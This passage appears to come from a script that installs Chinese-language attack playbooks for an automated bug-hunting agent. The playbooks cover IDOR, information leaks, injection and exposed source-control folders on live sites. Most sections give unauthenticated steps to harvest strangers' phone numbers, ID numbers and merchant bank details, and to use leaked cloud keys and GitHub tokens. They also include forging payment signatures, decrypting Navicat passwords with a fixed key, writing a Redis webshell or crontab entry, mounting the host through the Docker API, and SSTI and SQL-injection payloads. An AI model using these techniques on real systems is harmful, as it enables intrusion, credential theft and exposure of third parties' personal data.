认：CRM / 企业 IM 客户详情口前端只写了外部联系人 id（`externalUserId` / `contactId`）。只带这个 id 回空壳。后端还吃 `phone`，常还要 `tagShow` / `udfShow` 才出内部字段。

打（不登录）：

1. 对照只带外部联系人 id 应空壳  
2. body 加 11 位 `phone`，并把 `tagShow` / `udfShow`（或同类展开字段）打开  
3. 空号 / 乱填应空壳；换号必须换人  

算成：出他人姓名 / 公司 / 内部 UDF，且查的就是这个完整号。

假点：phone 一律空或只出同一条测试号。身份证槽位空不算假点。单站没中不删短表这行。

### 助手历史未授权读他人任务（短表有指针）

认：助手/Agent 前端有 `GetHistoryList`；登录态只在可选头里。不是对话口工具执行（那枪见 `agent-tool-exec-test.md`）。

打（不登录）：调列表，换 guid 对照是否同一批；再把 `session_id` 丢给 `GetHistory`。翻页 `last_ts`+`direct=back`。

算成：列表/详情出现**他人**任务原文（下载、订阅、对话卡片），不是公开广场。

假点：只出广场 `GetSquareTasks`/`share_id`；换 guid 列表变空或只剩自己的。单站没中不删短表这行。

### 写死 appKey 打业务表（短表有指针）

认：前端 `AV.init` / LeanCloud 写死 `appId`+`appKey`（或 `X-LC-Id`/`X-LC-Key`）；或 nocode/supabase 落地页写死 `role=anon` JWT。

打（不登录）：带这两头打 `/1.1/classes/*`：先 `_User` 对照应 403，再扫业务表 count/limit，能写就改探测字段再删回。supabase 带 `apikey`+`Authorization: Bearer` 打 `/rest/v1/` swagger 列出的表。**rest 表 403 / 只有公开运营配置别停**：改打 `POST /storage/v1/object/{桶}/{官方前缀}`，头 `x-upsert:true`（见 `file-upload-test.md` STS 第 9 步）。

算成：业务表 `count` 海量或出现**他人**稿/邮箱/电话；PUT 改别人 `objectId` 成功。

假点：`_User` 和业务表都 403；只能读自己刚建的；只能 LIST 公开运营配置。单站没中不删短表这行。密钥实值不进库。

### 填表模型带标准答案（短表有指针）

认：问卷/测验填表模型口；前端写死业务 id 或白名单（`FORM_WHITE_LISTS` / 演示 encryptFormId 一类）；回包 schema 带 `answer` 标准答案或内部审核题干/样图。不是公开报名表标题，也不是已经交过的答卷列表。

打（不登录）：

1. 从 JS 白名单/演示 id 打 getModel / schema / getFormModel，别停在表单标题  
2. schema 里的样图 preview/imgUrl 跟着打开  
3. 管理 list/export/fillList 另打；没有填写记录不要编答卷  

算成：内部测验正文+标准答案，或证件/执照样图真下到。

假点：只有公开报名表标题；schema 没有 answer；只有自己刚填的答卷。单站没中不删短表这行。

### 未授权内部话术正文（短表有指针）

认：客服/开发者支持台 umi 有 `getKnowledgeList.json` + `getKnowledgeInfo.json`；或大厅/帮助 HTML 详情口吃数字篇号；或对外公告 JSON（bulletin / getbulletin 一类）用 `callname` + `callcontent` 当 RPC，页面只调公开菜单（`getKnowledgeByMenuId`）；或未登录 CMS `siteList` / `contentList` / `content` 能列出非官网站点，且频道名带「内部知识库」；或客服/IT chatbot 未登录检索口（菜单 id + 模糊 searchText），正文在 `buttonList`/`searchList` 的 `behavior.value`，不在标题 `content`。不要只认 umi 那一套 json。

打（不登录）：对照 `queryUserInfo`/`queryFeedbackList` 应 deny。列表 `categoryId` 从 1 试，再把 `id` 丢给 Info。**没有 json 列表也打 HTML 详情**（`showKnowledgeInfo.htm?knowledgeId=` / `help_detail.htm?help_id=`），用现代 UA（IE 可能触 netd）。公告口：页面公开菜单对照条数很少时，把 `callname` 换成 `getKnowledgeList`（`callcontent` 带翻页），再 `getKnowledge` 打详情 id。CMS：先 `siteList` 抄非官网 siteId，再 `contentList` 看频道名，换 siteId 打 `content` 详情；默认官网 Banner 不是这枪。网关报 `loginMode is null` 别停，头加 `loginMode: 0`；siteList 仍缺 siteId 失败时，直接带内部 siteId 打 contentList。content 也要带 siteId，缺了会当没正文。chatbot：`chat_dir_id` 一类目录口 401 别停，改打检索口（`search_recommend` 一类），`searchText` 填常用字、`id` 填菜单号；正文看 `behavior.value`。

算成：列表 `pager.items` 上千或 count 海量，且 Info/HTML/详情/`behavior.value` 出**内部**话术/协查/短信/运营知识库正文，不是公开 FAQ / 对外协议。

假点：只有公开帮助稿/错误码/对外协议/官网 Banner；Info 只要标题；工单口也放行（那是另一条）；只打了默认官网站点；dir 节点 401 就停；检索口只出标题 content。单站没中不删短表这行。

### 开放支付假签枚举 appId（短表有指针）

认：开放支付 / 进件网关 body 有 `appId`+`sign`（可再加 `random`/`merchantId`）。假签时活应用回 `MERCHANT_NOT_EXIST` 或 `SUCCESS`，死应用回 `SIGN_ERROR` / `APP_NOT_FOUND`。不是「JS 写死盐自己算」那一行，也不是文档里抄出真 AppSecret。

打（不登录）：

1. `sign` 填一串假值（32 个 `a` 一类），扫 `appId`，对照回码  
2. 活的再打商户查询（`query` / `query/v2`）换 `merchantId`（文档示例号、邻号）  
3. 同一套假签再点签订/协议口，只看回包是否接受；不要批量签、不要改结算卡  

4. **ST / 演示收银台预下单**假签或 node 代签也能进生产网关时：不登录 POST `/api/precreate` 或 `/demoapi/precreate`，sign 填假值 + 活 appId + 他人 merchantId。本站查单 404 别停，打生产 `/api/pay/query`。

算成：出他人商户身份证 / 银行卡 / 手机；或生产查单 `ORDER_NEW` 且有他商户交易号。

假点：假签一律 `SIGN_ERROR`；`SUCCESS` 但证件卡号全空；文档示例 appId 已死；只回 `channelPayerNo` 且生产查单不存在；只能给演示店挂。单站没中不删短表这行。密钥实值不进库。

### 短链 302 query 带手机（短表有指针）

认：短信/运营短链解析站；猜中的短码 302 到落地页，query 明文带 `phone` / `name` / 金额。首页可能是 OpenResty 欢迎页、302 到品牌官网、或 `index.html` 只有 Hello，**不要只看 `/` 当整站证伪**。

打（不登录）：

1. `/open` `/app` `/s/` `/www` 加短字典（`aaaaa`、`1`、`1234`）  
2. 只看 302 目标 query，不要跟到落地业务域  
3. 对照：对不上的码应失效页、没有手机号  

算成：跳转地址里是**别人**的手机/姓名。

假点：失效页；公开营销无 PII；短码要真短信才解析。单站没中不删短表这行。首页 Welcome / 302 官网 / Hello 壳不是假点。

### 隐私号失败回真实号（短表有指针）

认：订单/门店/物流 H5 调隐私号或虚拟号（AXB）口；未登录只要业务 appid + 可遍历对象号。失败时回包把真实 11 位手机当下发，文案还写获取隐私号失败、将用真实号码拨打。不要只当虚拟号口丢掉。

打（不登录）：

1. 前端抄 functionId / 隐私号 path，对象号从 0、2、邻号打  
2. 对照：非数字对象号应参数错、没有手机  
3. 换号号码变才算批量  
4. 网关空 Origin 或本站 Origin 回 `cross-origin 403` **别停**，改业务域 Origin（订单 / 购物车 / H5 域，不钉某一家 host）再打  

算成：回包是**他人**真实手机。

假点：只出虚拟号/中间号；必须登录；换号号码不变；空 Origin 403 当没口。单站没中不删短表这行。

### 入驻 H5 空参出招商通讯录（短表有指针）

认：入驻 H5 有招商电话页；同套其它 settle 口 302 未登录。JS 里按品类查 BD 的 RPC（queryBd / bdInfo 一类），industry/类目空时 body 空。页面上可能只摆 400 热线。

打（不登录）：

1. 从招商电话页 JS 抄网关 `/api` 和 functionId  
2. 类目字段空着打（`body={}`）。对照：填死数字类目号常回空数组  
3. 同套其它 settle 口 302 别当整站没口  

算成：内部 BD 姓名+11 位手机+企业邮箱整表。

假点：类目填死数字出空数组就当没口；把页面公开 400 热线当这枪。单站没中不删短表这行。

### 入驻 H5 写死 token 换 pin（短表有指针）

认：入驻 H5 / 小程序打包 JS 把 OCR / 企业信息口 token 写死。JSON 口只要 pin（或同类账号）+ 非空 token，不要 Cookie。对照：token 留空或省略只回空 data。

打（不登录）：

1. 从入驻 chunk 抄写死 token 和企业信息 path  
2. 空 token 对照应空 data  
3. 带写死 token，pin 用 `admin` / `test` / `0` / 短账号再打  
4. 写死那串过了，再填任意非空串对照（过了说明不校验 token 内容）  

算成：换 pin 出对应真实手机。

假点：空 token 也出数（完全无鉴权，另一条）；token 过了仍只出自己刚入驻的。单站没中不删短表这行。密钥实值不进库。

### 公司名/抬头自动完成（短表有指针）

认：报名/入驻/发票抬头自动完成；页上下拉只出公司名；接口走工商/邓白氏 Match 或抬头 suggest。前端可能把该口标 `auth:true`，服务端仍不验登录。

打（不登录）：

1. POST 名称+国家码，或抬头口。suggest 字段可能是 `prefix`（填 `title` 会报「关键词不能为空」像没入口）  
2. suggest 报关键词空别停：同产品还有专票/工商补全口，字段就是 `title`，前端标 `auth:true` 仍打  
3. 对照页面下拉：页上只有公司名，回包多出手机/卡/住址才算  

算成：回包出现负责人或开票手机/住址/银行账号，且对得上人。

假点：下拉和接口都只有公司名；必须登录；公开企业名录没有电话；前端标 auth 就当没洞。单站没中不删短表这行。


### Mass Assignment / 隐藏可写字段（短表有指针）

认：注册 / 改资料 / 建用户的 JSON 比页面控件多；Swagger、管理员「建用户」或前端注释里多出 `role` / `isAdmin` / `verified` / `tenantId` / `balance` / `permissions`。

打：

1. 对照管理员建用户 vs 自己注册/改资料，差出来的字段才塞。没有对照就从 Swagger / JS 抄。
2. 只对自己的号塞一次；过了立刻改回。不要改别人已有账号的角色。
3. `__proto__` / 嵌套 `user.role` 也试；这和 PP 模板 RCE 不是一条（PP 见 `prototype-pollution-test.md`）。

算成：自己号变成高权，或余额/认证状态真变。字段吃了、权限没变 → 没成。

假点：只能改展示名；公开运营开关；服务端白名单吞掉多余键。单站没中不删短表这行。没注册/改资料口不要发明字段。

## 12. QUICK IDOR CHECKLIST

```
□ 有对照号更好；单号用列表/回包/邻号，不为第二号磨注册
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint（写：先 POST 添加，再删自己加的那条；勿删别人已有对象）
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own）
□ 密文 id：JS 有公钥就自己加密相邻数字（见「密文 ID」）
□ 列表租户字段试 0 / -1 / 空（换真实他 ID 失败也试；见「哨兵租户」）
□ 有 Registry/`/v2/`：自己号打 `_catalog`，能否列出并 pull 他租户镜像（见「制品库 catalog」）
□ BaaS 匿名 session 后再 listRows，对照无 Cookie 的空表（见「匿名会话读报名表」）
□ 云开发匿名登录后再打 `lowcode-datasource` 的 `sys_user`/`wedaGetRecords`；HTTP 网关 `LOGIN_TYPE_DISABLED` 别停（见「云开发匿名用户表」）
□ 详情带 specifyUsers/openid：抄 openid 打信箱（见「详情抄 openid 再打信箱」）
□ 发布页 artifactMap 的 nodeId 打 pagechunk（见「资料库 nodeId 未授权读全文」）
□ 助手 GetHistoryList 可选头：不登录调列表/详情（见「助手历史未授权读他人任务」）
□ 前端写死 LeanCloud/supabase anon：打业务表（见「写死 appKey 打业务表」）
□ 知识列表+详情未登录出内部话术（见「未授权内部话术正文」）
□ 开放支付进件网关假签枚举 appId，活应用再换 merchantId（见「开放支付假签枚举 appId」）
□ 短信短链首页 Welcome / 302 官网 / Hello 壳别停，猜 /open /app /s/ /www 看 302 query 手机（见「短链 302 query 带手机」）
□ 未登录隐私号/虚拟号口失败时看是不是真下发真实手机，对象号可遍历（见「隐私号失败回真实号」）
□ 报名/入驻/发票抬头自动完成：不登录打 suggest（prefix）和专票/工商补全口（title）；前端标 auth 仍打（见「公司名/抬头自动完成」）
□ 入驻 H5 招商电话页：JS 查 BD 口类目空着打，不要填死数字（见「入驻 H5 空参出招商通讯录」）
□ 后台 SPA 把头 User-Id 当身份：名单只有数字号别停，把头换成这个号打当前人信息口（见「自定义身份头当会话」）
□ 浏览页/目录写访客请登录别停，同站 search（Keyword+Page）未登录也打，跟详情 URL（见「列表过滤详情不闸」第 15 步）
□ 目录请登录才能下别停，同站文件列表口+权限口 PreviewUrl 未登录也打（见「列表过滤详情不闸」第 17 步）
□ 对外搜索口 `materialType`/`tab` 改成内部类型；path 缺 v2 报 auth failed 别停（见「列表过滤详情不闸」第 9 步）
□ 入驻/审核 query 只带业务 id 出空壳时加审核状态=已通过，回包 uid 跟邮箱口（见「列表过滤详情不闸」第 10 步）
□ 文档站公开 itemList 只有对外产品别停，item 纯数字打详情/page（见「列表过滤详情不闸」第 19 步）
□ 收集表/问卷填报详情 relative 挂答卷 sheet 别停，不登录打答卷表（见「列表过滤详情不闸」第 20 步）
□ supabase anon JWT：rest 表之外打 Storage REST + x-upsert 盖官方前缀（见 file-upload STS 第 9 步）
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status：只改自己的单 / 能改回去的测试字段
□ 商家绑促销/券：改 productId 挂到别人的货，C 端价掉才算（见 logic-test.md §1.4）
```

---


商家绑促销/券到 SKU：只校验券归属、不校验商品归属 → 自己的券 + 别人的 productId，C 端价掉才算。正文在 logic-test.md §1.4。
TECH_IDOR_TEST_EOF

seed_rule techniques/info-leak-test.md <<'TECH_INFO_LEAK_TEST_EOF'
> 写不写只认 `rules/srcskill/vuln-report-format.md`。本篇测：版本/框架/health/无账密壳/指纹 → 继续挖完整账密、密钥、跨主体业务数据。抄到账密/云密钥/token：须假值对照，认钥枪带出身份或列表，再打不影响线上的只读例才交；手机号加解密钥不写。
> 结构：本篇较短，可整篇开。中间件端口见了再打（§五），不是每站先扫端口。

# 信息泄露测试手册

## 一、常见泄露点

### 1.1 接口响应字段过多

```bash
# 测试登录/用户信息接口是否返回敏感字段
curl "https://target.com/api/user/info" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 关注字段:
# password, passwordHash, salt
# idCard, bankCard, realName
# phone (未脱敏), email
# secretKey, apiKey, token
# internal fields: is_admin, role, balance_internal
```

### 1.2 错误信息泄露

```bash
# 发送畸形请求触发错误
curl "https://target.com/api/user?id='"
curl "https://target.com/api/user?id[]=1"

# 关注响应中:
# 数据库报错（SQL语句暴露）
# Stack trace（代码路径暴露）
# 内网 IP 地址
# 框架/版本信息
```

---

## 二、文件/目录泄露

### 2.1 常见敏感路径

```bash
# 开发遗留文件
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/.env
/.env.local
/.env.production
/config.php
/config.yml
/application.properties
/application.yml
/web.config

# 备份文件
/index.php.bak
/index.php~
/backup.zip
/backup.tar.gz
/www.zip
/site.tar.gz
/db.sql
/database.sql

# API 文档（可能泄露接口列表）
/swagger-ui.html
/api-docs
/v2/api-docs
/swagger.json
/openapi.json
/doc.html
/redoc

# 监控/运维端点
/actuator
/actuator/env
/actuator/mappings
/actuator/beans
/metrics
/health
/info
```

### 2.2 自动扫描

```bash
# ffuf 批量检测
ffuf -u "https://target.com/FUZZ" \
  -w sensitive_paths.txt \
  -mc 200,301,302,403 \
  -t 30 -o leaks.json -of json

# 从 ffuf 结果过滤 403（可能有内容但被拦截，值得深入）
cat leaks.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data['results']:
    print(f\"{r['status']} {r['url']} ({r['length']} bytes)\")
"
```

---

## 三、JS 文件信息泄露

```bash
# 从 JS 文件中提取敏感信息
# 下载所有 JS 后搜索:
grep -rE "(apiKey|api_key|secret|password|token|ak|sk)\s*[=:]\s*['\"][^'\"]{8,}" *.js

# AK/SK 泄露（云服务凭证）
grep -E "AKID[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "LTAI[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "AKIA[A-Za-z0-9]{16,}" *.js       # AWS
grep -E "[a-zA-Z0-9+/]{40}=" *.js         # 疑似 Base64 密钥

# GitHub PAT（文档/社区站常把贡献者插件的钥打进 bundle）
grep -oE "ghp_[A-Za-z0-9]{20,}" *.js
grep -oE "github_pat_[A-Za-z0-9_]{20,}" *.js

```

### 3.1 文档站 GitHub PAT

开源文档/社区前端为拉 GitHub org、贡献者、star 把头，常把 `ghp_` / `github_pat_` 打进打包 JS。

不登录从 JS 抄出来：

```bash
curl -s "https://api.github.com/user" -H "Authorization: token $PAT"
# 对照：不带头应 401
curl -s "https://api.github.com/user/repos?affiliation=owner&per_page=5" -H "Authorization: token $PAT"
```

算成：me 是真人 login/姓名，且对该号仓 `permissions.admin=true`（能当这个 GitHub 号用）。官方 org 仓只有 pull 也要把个人仓 admin 写进危害。

假点：钥已吊销；`/user` 401；只是 GitHub App 安装令牌读公开 org。密钥实值只进正式报告，不进本篇。

### viewer JS XOR 藏对象存储永久钥（短表有指针）

认：落地页/viewer JS 有 `usePrivateCode`（或同类函数名），`COS_TOKEN` 的 SECRET_ID/SECRET_KEY 不是明文 AKID。编码：前 16 个字符当循环 XOR 钥匙，后面一段 hex 解开才是永久 AK/SK。只 grep `AKID` 会当没钥。

打（不登录）：解开后签 `云 STS 接口` **GetCallerIdentity**，再 `云 CAM 接口` **GetUserAppId**。ListBuckets 403 别停。

算成：问出 AccountId/Uin/AppId。长期钥，不是几分钟过期的临时票。

假点：解开调云 API AuthFailure；`exampleValue` 解成 `hello_world` 占位。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 管理台 JS 写死 CI 仓钥（短表有指针）

认：管理台前端 JS 写死 CI 的 `pipelineId` + base64 `auth`，且有未登录 trigger 口。

打（不登录）：抄 auth 调 `Git 托管开放接口` open-api `DescribeMyDepots`；本站 trigger 只作对照。

算成：列出他团队私有仓库名/HttpsUrl/ProjectId，或钥 scope 含 `depot_read` 且开放接口认钥。

假点：钥过期；仓是公开的；只有 trigger 回产品下线、没有证明钥还能列出私仓。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 文档 chunk 里的真实证件样例（短表有指针）

认：开放平台文档中心；页面文档/分类口 401；入口 script 有 DocPage 动态 `import()` 的 `technical-document`（或同类文档 chunk）。不是「调试文档写死 AppSecret」那一行。

打（不登录）：文档 API 401 别停。跟首页 script → DocPage `import()` → 文档 chunk。抠样例请求/响应报文里的身份证、手机、姓名。过校验位才往下。

算成：过校验位的身份证 + 姓名/手机，对得上人。

假点：张三/110101 占位；校验位不对的编造号；空 `appliIdNo` 模板；只有公开产品说明书没有样例报文。单站没中不删短表这行。证件实值只进正式报告。

### 匿名领签包里的连接配置（短表有指针）

认：企业软件中心人打开是登录页；另有领对象存储带签口不要 Cookie；或同站 `/download/`+软件文件名不要 Cookie；压缩包里是 Navicat `ncx`（连接名、Host、账号、`SavePassword` 密文）。首页 302 去登录墙时，**302 响应体里内联的领签函数也算入口**，别只看落地登录页。

打（不登录）：领签口把带签 URL 拿出来，Range GET 真 zip。**领签没有/要登录别停**：302 体或首页软件列表里的文件名，同站 `GET /download/{文件名}` 直下（乱填文件名常 302 回首页，对上名字才 200）。解出 `*.ncx`。Password 用 Navicat 12 固定钥匙 `libcckeylibcckey`、IV `libcciv libcciv` 做 AES-128-CBC，去掉 PKCS7。

算成：内网库 Host+账号+明文密。密钥实值只进正式报告。

假点：包里只有公开客户端没有连接配置；密文解不开。单站没中不删短表这行。

### 分布式文件 master 未授权用户钥（短表有指针）

认：公网 HTTP `/version` 出 `"Model":"master"`（分布式文件集群）。管理口不要登录。

打（不登录）：

1. `GET /user/list` 拿 `access_key`+`secret_key`
2. 对照：假 16 位 ak 打 `GET /user/akInfo?ak=` 应 `access key not exists`；真 ak 问出 `user_id`/user_type
3. `GET /admin/getVol?name=` 看他用户业务卷（Owner / InodeCount）

算成：完整 AK/SK 且真钥问出身份/他用户业务卷。

假点：只出版本/集群名没有钥；list 空；真假钥同一句；只有自己的空测试卷。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

```bash
# 内网地址泄露
grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}" *.js
```

---

## 四、特殊接口泄露

### 4.1 分页接口越界

```bash
# 大页码获取全量数据
?page=99999&pageSize=1000
?offset=0&limit=99999

# 导出接口未限制数量
/api/export/users?format=csv
/api/export/orders?startTime=2020-01-01&endTime=2026-01-01
```

### 4.2 搜索接口通配符

```bash
# 模糊搜索获取全量数据
?keyword=%         # URL 编码的 %，SQL LIKE 通配符
?keyword=*
?keyword=.         # 部分系统
?q=               # 空搜索返回所有
```

### 4.3 GraphQL 自省

```bash
# GraphQL 接口泄露 schema
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 如果返回完整 schema → 可能泄露未公开的接口和字段
```

---

## 五、中间件端口见了怎么打

> **见了才打。** 不是每站先 nmap 全端口。FOFA/进站/响应头已经露出这些端口或控制台，再按表走。打穿了按 `vuln-report-format` 落盘；health/版本壳继续跟账密，不要停在 PONG。

| 见什么 | 打哪 | 出什么算成 | 假点 / 转哪 |
|--------|------|------------|-------------|
| `:6379` Redis，无密码 `PING`→`PONG` | 写 webshell / crontab / `authorized_keys`（目录得是真 web 根或 cron）。SSRF 走到这口用 `gopher://`，见 `ssrf-test.md` | 命令跑起来，或读到业务库 | 有 `requirepass`；`CONFIG` 被 rename；只能 `PING` |
| `:873` rsync 匿名 `rsync host::` 列出模块 | 下业务文件；模块可写再看能否写 cron | 拉到密钥/业务数据 | 空模块；只读且全是公开静态 |
| `:9000` PHP-FPM/FastCGI 直接暴露 | FastCGI 包打已有 `.php`（`PHP_VALUE=auto_prepend_file=php://input`）。SSRF 用 gopherus fastcgi | 指定 PHP 被执行 | 只 Unix socket、外网 9000 不是 FPM |
| `:8009` AJP | Ghostcat 读 `/WEB-INF/web.xml`。见 `path-traversal-lfi-test.md` §21 | 读到 web.xml / class | `secretRequired`；端口不是 AJP |
| `:8088` Hadoop YARN UI | `POST /ws/v1/cluster/apps/new-application` 再提交带 `commands` 的 app | 集群里跑了你的命令 | 只要 UI 登录墙；提交 401 |
| `:2375` Docker API | `GET /v1.24/containers/json`；能 create 再挂 `/:/host` | 列出容器或读到宿主机文件 | TLS 2376 无客户端证；只 version |
| `/h2-console` | JDBC URL JNDI 或 `CREATE ALIAS`。见 `jndi-injection-test.md`「H2 Console」 | 命令跑起来 | 只本机能开 |

公网直接打和 SSRF 打内网是同一套 sink，差别只是入口。没这些端口不要为了本表去扫。
TECH_INFO_LEAK_TEST_EOF

seed_rule techniques/injection-test.md <<'TECH_INJECTION_TEST_EOF'
> 进站勾完标准见 `rules/srcskill/dig-scope-workflow.md` §4.2.1：能看出条数/内容变化的口，每个过滤参都测；只回「请登录」整段 N/A。按栈选探针（JSON/Mongo 操作符、搜索框 ES、Java HQL/SpEL、有模板 SSTI；SQL 面仍走引号/布尔/延时）。405 后换位置不只有换编码。
> 短表「列表筛选项 OR + total」「邮件订阅 iframe 同目录 list」用标题搜。WooYun 统计 / sqlmap --os-shell / 反弹 shell / 英文附件已砍；现场按栈自己变，不靠教材。

# 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

## SQL 注入

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

### 邮件订阅 iframe 同目录 list（短表有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删短表这行。不要对全站同皮客户开 FOFA。

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页。探针 `;id` / `|id` / `$(id)` / 延时 `sleep 5`。证伪即可，不要本机反弹 shell 当教材。

## SSTI（服务端模板注入）

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### 常见框架利用

```python
# Jinja2 (Python/Flask)
{{config}}                           # 信息泄露
{{''.__class__.__mro__[2].__subclasses__()}}  # 获取类
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
TECH_INJECTION_TEST_EOF

seed_rule techniques/insecure-scm-test.md <<'TECH_INSECURE_SCM_TEST_EOF'
# insecure-scm

# Insecure Source Code Management

## 0. QUICK START

High-value paths to probe first (GET or HEAD, respect rate limits):

```http
/.git/HEAD
/.git/config
/.svn/entries
/.svn/wc.db
/.hg/requires
/.bzr/README
/.DS_Store
/.env
```

**Routing note**: quickly probe these paths first; for full recon workflow, load methodology from `recon-methodology.md` before deeper testing.

---

## 1. GIT EXPOSURE

### Detection

- **`/.git/HEAD`** — valid repo often returns plain text like:

```text
ref: refs/heads/main
```

- **`/.git/config`** — may expose `remote.origin.url`, user identity, or embedded credentials.
- **`/.git/index`**, **`/.git/objects/`** — partial object store access enables reconstruction with the right tools.

### 403 vs 404

- **`404`** — path likely absent or fully blocked at the edge.
- **`403` on `/.git/`** — directory may **exist** but listing is denied; still try direct file URLs:

```http
/.git/HEAD
/.git/config
/.git/logs/HEAD
/.git/refs/heads/main
```

A **403 on the directory** plus **200 on `HEAD`** strongly indicates exposure.

### Recovery tools (open source)

- **`arthaud/git-dumper`** — dumps reachable `.git` tree when individual files are fetchable.
- **`internetwache/GitTools`** — Dumper, Extractor, Finder modules for partial/corrupt dumps.
- **`WangYihang/GitHacker`** — alternative recovery when standard dumpers miss edge cases.

### Key files to prioritize

| Path | Why it matters |
|------|----------------|
| `.git/config` | Remotes, credentials, hooks paths |
| `.git/logs/HEAD` | Commit history, reflog-style leakage |
| `.git/refs/heads/*` | Branch tips, commit SHAs |
| `.git/packed-refs` | Packed branch/tag refs |
| `.git/objects/**` | Object blobs for reconstruction |

---

## 2. SVN EXPOSURE

### Detection

- **SVN before 1.7**: **`/.svn/entries`** — XML or text metadata listing paths and revisions.
- **SVN ≥ 1.7**: **`/.svn/wc.db`** — SQLite working copy database (`PRAGMA table_info` after download).

Example probe:

```http
GET /.svn/entries HTTP/1.1
GET /.svn/wc.db HTTP/1.1
```

### Recovery

- **`anantshri/svn-extractor`** — automated extraction from exposed `.svn`.
- **Manual**: download `wc.db`, query with `sqlite3` for file paths and checksums, then request **`/.svn/pristine/`** blobs if exposed.

---

## 3. MERCURIAL EXPOSURE

### Detection

- **`/.hg/requires`** — small text file listing repository features; confirms Mercurial metadata.

```http
GET /.hg/requires HTTP/1.1
GET /.hg/store/ HTTP/1.1
```

### Recovery

- **`sahildhar/mercurial_source_code_dumper`** — dumps repository when store paths are reachable.

---

## 4. OTHER LEAKS

### Bazaar (Bzr)

- Probe **`/.bzr/README`** and **`/.bzr/branch-format`** for Bazaar metadata.

### macOS `.DS_Store`

- **`/.DS_Store`** can encode directory and filename listings.
- Tools: **`gehaxelt/ds-store`**, **`lijiejie/ds_store_exp`** — parse `.DS_Store` offline.

### Backup and config artifacts

Probe (adjust for app root and naming conventions):

```text
/.env
/backup.zip
/backup.tar.gz
/wwwroot.rar
/backup.sql
/config.php.bak
/.config.php.swp
```

### Web server misconfiguration signal (example: NGINX)

- **`location /.git { deny all; }`** — may return **403** for `/.git/` while still allowing or denying specific subpaths depending on rules.
- **403 on a protected location** can **confirm the route exists**; always distinguish from **404** on non-existent paths.

---

## 5. DECISION TREE

1. **Probe `/.git/HEAD`** → `ref: refs/heads/` pattern? → run **git-dumper / GitTools / GitHacker**; review `config` and `logs/HEAD` for secrets.
2. **Else probe `/.svn/wc.db` or `entries`** → success? → **svn-extractor** or manual `wc.db` + pristine recovery.
3. **Else probe `/.hg/requires`** → success? → **mercurial dumper**.
4. **Else probe `/.bzr/README`** → Bazaar tooling or manual path walk.
5. **Parallel**: fetch **`/.DS_Store`**, **`/.env`**, common **backup extensions** on app root and parent paths.
6. **Interpret status codes**: **403 on directory** + **200 on specific files** → treat as **high priority** for file-by-file extraction.
